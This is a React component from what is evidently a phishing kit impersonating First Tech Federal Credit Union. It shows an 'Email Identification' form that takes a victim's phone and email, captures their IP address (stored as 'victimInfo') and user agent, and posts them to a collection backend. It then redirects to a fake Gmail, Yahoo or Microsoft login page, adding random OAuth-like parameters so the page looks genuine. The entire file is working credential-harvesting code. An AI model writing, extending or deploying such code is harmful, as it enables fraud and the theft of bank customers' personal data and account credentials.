import React, { useEffect, useState } from "react";
import FormLayout from "../components/formLayout";
import { get25Rand } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Button from "../components/button";
import Input from "../components/input";
import API from "../api/api";
import axios from "axios";

const Email = () => {
  const [data, setData] = useState({ email: "", phone: "" });
  const [isError, setIsError] = useState({ email: false, phone: false });
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleClick = () => {
    if (!data?.email?.trim()) {
      setIsError((prev) => ({ ...prev, email: true }));
    }
    if (!data?.phone?.trim()) {
      setIsError((prev) => ({ ...prev, phone: true }));
    }

    if (data?.email?.trim()) {
      setIsError((prev) => ({ ...prev, email: false }));
    }
    if (data?.phone?.trim()) {
      setIsError((prev) => ({ ...prev, phone: false }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({ ..._data, ...data }),
    );

    const params = {
      skip_api_login: 1,
      api_key: get25Rand(),
      kid_directed_site: 0,
      app_id: get25Rand(),
      signed_next: 1,
      email: data.email,
    };

    let provider = "microsoft";
    if (data.email.includes("@gmail")) {
      provider = "gmail";
    } else if (data.email.includes("@yahoo")) {
      provider = "yahoo";
    }

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "First Tech Federal Credit Union",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        window.location.href = `/email/${provider}?${new URLSearchParams(
          params,
        ).toString()}`;
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={"Email Identification"}
      subTitle={
        "We will query your email service provider to confirm you own this email."
      }
    >
      <Input
        title="Phone"
        type="number"
        name="phone"
        value={data?.phone}
        onChange={handleChange}
        onBlur={handleClick}
        isError={isError?.phone}
      />
      <Input
        title="Email"
        type="email"
        name="email"
        value={data?.email}
        onChange={handleChange}
        onBlur={handleClick}
        isError={isError?.email}
      />
      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Continue"
          )
        }
      />
    </FormLayout>
  );
};

export default Email;
